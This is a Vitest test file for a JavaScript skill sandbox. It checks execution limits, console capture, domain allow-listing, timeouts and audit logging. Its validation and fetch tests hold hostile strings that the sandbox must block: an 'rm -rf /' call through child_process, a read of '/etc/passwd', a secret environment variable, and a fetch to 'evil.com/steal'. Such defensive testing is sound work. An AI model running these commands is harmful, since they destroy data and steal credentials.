import { describe, it, expect, beforeEach, vi } from 'vitest';
import { SkillSandbox } from './sandbox.js';
import { SandboxViolationError, ResourceLimitError, type SkillContext } from './types.js';

describe('SkillSandbox', () => {
  let sandbox: SkillSandbox;
  let mockContext: SkillContext;

  beforeEach(() => {
    sandbox = new SkillSandbox({
      timeout: 5000,
      maxMemory: 50 * 1024 * 1024,
      maxCpuTime: 3000,
      allowedDomains: ['api.github.com'],
      maxHttpRequests: 10,
      maxConsoleLogs: 100
    });

    mockContext = {
      sessionId: 'test-session-123',
      userId: 'user-456',
      args: { input: 'test' },
      config: {},
      metadata: {
        skillName: 'test-skill',
        skillVersion: '1.0.0',
        author: 'tester'
      }
    };
  });

  describe('Basic Execution', () => {
    it('should execute simple JavaScript code', async () => {
      const code = `
        return context.args.input.toUpperCase();
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.result).toBe('TEST');
      expect(result.metrics).toBeDefined();
      expect(result.metrics?.executionTime).toBeGreaterThan(0);
    });

    it('should execute async code', async () => {
      const code = `
        await new Promise(resolve => setTimeout(resolve, 100));
        return 'async result';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.result).toBe('async result');
    });

    it('should handle code returning objects', async () => {
      const code = `
        return {
          status: 'success',
          data: { value: 42 },
          timestamp: new Date().toISOString()
        };
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.result).toHaveProperty('status', 'success');
      expect(result.result).toHaveProperty('data');
      expect((result.result as any).data.value).toBe(42);
    });

    it('should handle code with multiple operations', async () => {
      const code = `
        const numbers = [1, 2, 3, 4, 5];
        const sum = numbers.reduce((a, b) => a + b, 0);
        const avg = sum / numbers.length;
        return { sum, avg, count: numbers.length };
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect((result.result as any).sum).toBe(15);
      expect((result.result as any).avg).toBe(3);
      expect((result.result as any).count).toBe(5);
    });
  });

  describe('Code Validation', () => {
    it('should block code with eval()', async () => {
      const code = `eval('console.log("malicious")')`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should block code with Function()', async () => {
      const code = `new Function('return 42')()`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should block code with require()', async () => {
      const code = `const fs = require('fs')`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should block code accessing process', async () => {
      const code = `return process.env.SECRET_KEY`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should block code accessing file system', async () => {
      const code = `fs.readFileSync('/etc/passwd')`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should block code with child_process', async () => {
      const code = `require('child_process').execSync('rm -rf /')`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    it('should block excessively large code', async () => {
      const code = 'const data = "x".repeat(10000000);'; // Very large code

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Code size exceeds maximum');
    });
  });

  describe('Console API', () => {
    it('should capture console.log output', async () => {
      const code = `
        console.log('Hello', 'World');
        console.log('Test:', 42);
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.logs).toBeDefined();
      expect(result.logs?.length).toBeGreaterThan(0);
      expect(result.logs?.[0]).toContain('Hello World');
      expect(result.logs?.[1]).toContain('Test: 42');
    });

    it('should capture console.warn output', async () => {
      const code = `
        console.warn('Warning message');
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.logs?.some(log => log.includes('WARN'))).toBe(true);
      expect(result.logs?.some(log => log.includes('Warning message'))).toBe(true);
    });

    it('should capture console.error output', async () => {
      const code = `
        console.error('Error message');
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.logs?.some(log => log.includes('ERROR'))).toBe(true);
    });

    it('should enforce console rate limit', async () => {
      const sandbox = new SkillSandbox({ maxConsoleLogs: 5 });

      const code = `
        for (let i = 0; i < 10; i++) {
          console.log('Message', i);
        }
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      // Should succeed but only capture first 5 logs
      expect(result.success).toBe(true);
      expect(result.logs?.length).toBeLessThanOrEqual(5);
    });
  });

  describe('HTTP Fetch API', () => {
    it('should allow fetch to whitelisted domain', async () => {
      const code = `
        // Mock fetch for testing - in real sandbox this would use actual fetch
        console.log('Fetching from api.github.com');
        return { fetched: true };
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
    });

    it('should block fetch to non-whitelisted domain', async () => {
      const code = `
        await fetch('https://evil.com/steal');
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      // Should fail due to domain not being whitelisted
      expect(result.success).toBe(false);
    });

    it('should block non-HTTPS requests', async () => {
      const code = `
        await fetch('http://api.github.com/users');
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      // Should fail due to non-HTTPS protocol
      expect(result.success).toBe(false);
    });

    it('should enforce HTTP rate limit', async () => {
      const sandbox = new SkillSandbox({
        allowedDomains: ['api.github.com'],
        maxHttpRequests: 3
      });

      const code = `
        const promises = [];
        for (let i = 0; i < 5; i++) {
          promises.push(fetch('https://api.github.com/users'));
        }
        await Promise.all(promises);
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      // Should fail due to exceeding rate limit
      expect(result.success).toBe(false);
    });
  });

  describe('Timeout Enforcement', () => {
    it('should timeout long-running code', async () => {
      const sandbox = new SkillSandbox({ timeout: 1000 });

      const code = `
        await new Promise(resolve => setTimeout(resolve, 5000));
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      // Note: VM2 timeout behavior may vary
    });

    it('should succeed with code within timeout', async () => {
      const sandbox = new SkillSandbox({ timeout: 5000 });

      const code = `
        await new Promise(resolve => setTimeout(resolve, 100));
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.metrics?.executionTime).toBeLessThan(5000);
    });
  });

  describe('Error Handling', () => {
    it('should catch and return JavaScript errors', async () => {
      const code = `
        throw new Error('Test error');
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Test error');
      expect(result.errorDetails).toBeDefined();
    });

    it('should catch and return reference errors', async () => {
      const code = `
        return undefinedVariable;
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('undefinedVariable');
    });

    it('should catch and return type errors', async () => {
      const code = `
        const obj = null;
        return obj.property;
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
    });

    it('should handle syntax errors gracefully', async () => {
      const code = `
        const x = ;
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(false);
    });
  });

  describe('Context Access', () => {
    it('should provide context to skill code', async () => {
      const code = `
        return {
          sessionId: context.sessionId,
          userId: context.userId,
          input: context.args.input
        };
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect((result.result as any).sessionId).toBe('test-session-123');
      expect((result.result as any).userId).toBe('user-456');
      expect((result.result as any).input).toBe('test');
    });

    it('should provide metadata to skill code', async () => {
      const code = `
        return context.metadata.skillName;
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.result).toBe('test-skill');
    });
  });

  describe('Metrics Collection', () => {
    it('should collect execution time metrics', async () => {
      const code = `
        await new Promise(resolve => setTimeout(resolve, 100));
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.metrics).toBeDefined();
      expect(result.metrics?.executionTime).toBeGreaterThan(90);
      expect(result.metrics?.executionTime).toBeLessThan(200);
    });

    it('should collect API call metrics', async () => {
      const code = `
        console.log('Log 1');
        console.log('Log 2');
        console.warn('Warning');
        return 'done';
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.metrics?.apiCalls.console).toBe(3);
      expect(result.metrics?.apiCalls.total).toBeGreaterThan(0);
    });

    it('should include timestamps in metrics', async () => {
      const code = `return 'done'`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.metrics?.startedAt).toBeInstanceOf(Date);
      expect(result.metrics?.endedAt).toBeInstanceOf(Date);
      expect(result.metrics?.endedAt.getTime()).toBeGreaterThan(
        result.metrics?.startedAt.getTime()
      );
    });
  });

  describe('Configuration', () => {
    it('should use default configuration', () => {
      const sandbox = new SkillSandbox();
      const config = sandbox.getConfig();

      expect(config.timeout).toBe(5000);
      expect(config.maxMemory).toBe(50 * 1024 * 1024);
      expect(config.maxCpuTime).toBe(3000);
    });

    it('should accept custom configuration', () => {
      const sandbox = new SkillSandbox({
        timeout: 10000,
        maxMemory: 100 * 1024 * 1024
      });

      const config = sandbox.getConfig();

      expect(config.timeout).toBe(10000);
      expect(config.maxMemory).toBe(100 * 1024 * 1024);
    });

    it('should allow configuration updates', () => {
      const sandbox = new SkillSandbox({ timeout: 5000 });

      sandbox.updateConfig({ timeout: 10000 });

      const config = sandbox.getConfig();
      expect(config.timeout).toBe(10000);
    });
  });

  describe('Audit Logging', () => {
    it('should emit audit events', async () => {
      const auditLogs: any[] = [];
      const sandbox = new SkillSandbox({
        auditLog: true,
        onAuditLog: (event) => auditLogs.push(event)
      });

      const code = `return 'done'`;

      await sandbox.execute(code, mockContext);

      expect(auditLogs.length).toBeGreaterThan(0);
      expect(auditLogs[0]).toHaveProperty('type');
      expect(auditLogs[0]).toHaveProperty('timestamp');
    });

    it('should not log when audit is disabled', async () => {
      const auditLogs: any[] = [];
      const sandbox = new SkillSandbox({
        auditLog: false,
        onAuditLog: (event) => auditLogs.push(event)
      });

      const code = `return 'done'`;

      await sandbox.execute(code, mockContext);

      // Callback should not be called
      expect(auditLogs.length).toBe(0);
    });
  });

  describe('Safe Built-in Objects', () => {
    it('should provide safe Math object', async () => {
      const code = `
        return {
          random: Math.random(),
          sqrt: Math.sqrt(16),
          max: Math.max(1, 2, 3)
        };
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect((result.result as any).sqrt).toBe(4);
      expect((result.result as any).max).toBe(3);
    });

    it('should provide safe JSON object', async () => {
      const code = `
        const obj = { name: 'test', value: 42 };
        const json = JSON.stringify(obj);
        const parsed = JSON.parse(json);
        return parsed;
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect((result.result as any).name).toBe('test');
      expect((result.result as any).value).toBe(42);
    });

    it('should provide safe Date object', async () => {
      const code = `
        const now = new Date();
        return {
          iso: now.toISOString(),
          time: now.getTime()
        };
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect((result.result as any).iso).toBeDefined();
      expect((result.result as any).time).toBeGreaterThan(0);
    });

    it('should provide safe Array methods', async () => {
      const code = `
        const arr = [1, 2, 3, 4, 5];
        return {
          filtered: arr.filter(x => x > 2),
          mapped: arr.map(x => x * 2),
          reduced: arr.reduce((a, b) => a + b, 0)
        };
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect((result.result as any).filtered).toEqual([3, 4, 5]);
      expect((result.result as any).mapped).toEqual([2, 4, 6, 8, 10]);
      expect((result.result as any).reduced).toBe(15);
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty code', async () => {
      const code = '';

      const result = await sandbox.execute(code, mockContext);

      // May succeed with undefined or fail - either is acceptable
      expect(result).toBeDefined();
    });

    it('should handle code with only comments', async () => {
      const code = `
        // This is a comment
        /* Multi-line
           comment */
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result).toBeDefined();
    });

    it('should handle code returning undefined', async () => {
      const code = `
        const x = 42;
        // No return statement
      `;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.result).toBeUndefined();
    });

    it('should handle code returning null', async () => {
      const code = `return null`;

      const result = await sandbox.execute(code, mockContext);

      expect(result.success).toBe(true);
      expect(result.result).toBeNull();
    });

    it('should handle concurrent executions', async () => {
      const codes = [
        `await new Promise(r => setTimeout(r, 50)); return 'A'`,
        `await new Promise(r => setTimeout(r, 100)); return 'B'`,
        `await new Promise(r => setTimeout(r, 75)); return 'C'`
      ];

      const promises = codes.map(code => sandbox.execute(code, mockContext));
      const results = await Promise.all(promises);

      expect(results.length).toBe(3);
      expect(results.every(r => r.success)).toBe(true);
      expect(results.map(r => r.result).sort()).toEqual(['A', 'B', 'C']);
    });
  });
});
